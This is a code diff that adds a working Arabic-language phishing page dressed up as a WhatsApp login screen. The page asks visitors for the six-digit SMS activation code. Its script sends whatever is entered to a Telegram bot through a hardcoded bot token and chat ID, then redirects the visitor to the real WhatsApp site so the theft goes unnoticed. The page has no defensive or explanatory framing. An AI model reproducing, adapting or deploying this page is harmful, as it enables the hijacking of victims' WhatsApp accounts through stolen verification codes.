@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yz/r/ujTY9i_Jhs1.png">
+    <title>WhatsApp Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FAF3E7;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Navigation Bar */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fff;
+            padding: 10px 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar .logo {
+            font-size: 24px;
+            color: #25D366;
+            font-weight: bold;
+        }
+
+        .navbar .nav-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .navbar .nav-links a {
+            text-decoration: none;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .navbar .toggle-menu {
+            display: none;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* Responsive Navbar */
+        @media (max-width: 768px) {
+            .navbar .nav-links {
+                display: none;
+                flex-direction: column;
+                gap: 10px;
+                background-color: #fff;
+                position: absolute;
+                top: 60px;
+                right: 10px;
+                padding: 10px;
+                border: 1px solid #ddd;
+                border-radius: 5px;
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            }
+
+            .navbar .nav-links.active {
+                display: flex;
+            }
+
+            .navbar .toggle-menu {
+                display: block;
+            }
+        }
+
+        /* Container */
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 500px;
+            margin: 20px auto;
+        }
+
+        .inopt {
+            border-radius: 6px;
+            padding-right: 5px;
+            border-color: #55555534;
+            border-width: 1px;
+            padding: 10px;
+            font-size: 14px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            color: #25D366;
+            margin-bottom: 10px;
+            height: 30px;
+        }
+
+        .www {
+            color: #25D366;
+            margin-bottom: 10px;
+            height: 30px;
+            font-size: 24px;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .icon {
+            width: 80px;
+            height: 80px;
+            background-color: #E7F4EB;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .icon img {
+            width: 40px;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            align-items: center;
+             
+            gap: 10px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 20px;
+            max-width: 200px;
+        }
+
+        select {
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        option {
+            padding: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #25D366;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #1DA955;
+        }
+
+        .dropdown-item {
+            display: flex;
+            align-items: center;
+        }
+
+        .flag {
+            width: 20px;
+            height: 15px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @media (min-width: 600px) {
+            .form-group {
+                flex-direction: row;
+                gap: 10px;
+            }
+
+            select,
+            input {
+                width: auto;
+                flex: 1;
+            }
+
+            button {
+                width: auto;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <div class="logo">
+            <img class="logo" src="./assets//DSxOAUB0raA.png" alt="">
+        </div>
+        <div class="toggle-menu" onclick="toggleMenu()">☰</div>
+        <div class="nav-links">
+            <a href="#">الأنشطة التجارية</a>
+            <a href="#">المدونة</a>
+            <a href="#">مركز المساعدة</a>
+            <a href="#">الخصوصية</a>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="www">WhatsApp</div>
+        <div class="title">تسجيل الدخول</div>
+        <div class="icon">
+            <img src="./assets/icons8-google-chat-48.png" alt="Chat Icon">
+        </div>
+        <div class="description">
+            أدخل رمز تفعيل الإضافة المكون من ٦ أرقام
+            الذي تلقيته من خلال رسالة نصية الذي تلقيته من خلال رسالة نصية
+        </div>
+        <div class="form-group">
+            
+            <input id="phoneNumber" class="inopt" type="text" placeholder="رمز تفعيل">
+        </div>
+        <button onclick="sendMessage()">متابعة</button>
+    </div>
+
+    <script>
+        function toggleMenu() {
+            const navLinks = document.querySelector('.nav-links');
+            navLinks.classList.toggle('active');
+        }
+
+        // Replace with your actual Telegram bot token and chat ID
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = '612575358';
+
+        function sendMessage() {
+            // Get country code and phone number
+           
+            const phoneNumberInput = document.getElementById('phoneNumber');
+
+           
+            const phoneNumber = phoneNumberInput.value;
+
+            // Validate inputs
+            if (!phoneNumber.trim()) {
+                alert('يرجى إدخال رقم الهاتف');
+                return;
+            }
+
+            // Combine country code and phone number
+            const fullPhoneNumber = `${phoneNumber}`;
+
+            // Create the message content
+            const message = `رمز تفعيل ${fullPhoneNumber}`;
+
+            // Send the message to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                       
+                        // Clear input fields
+                        phoneNumberInput.value = '';
+                    } else {  
+                    }
+                })
+                .catch(error => {
+                    
+                });
+
+                window.location.href = "https://www.whatsapp.com";
+
+        }
+    </script>
+</body>
+
+</html>
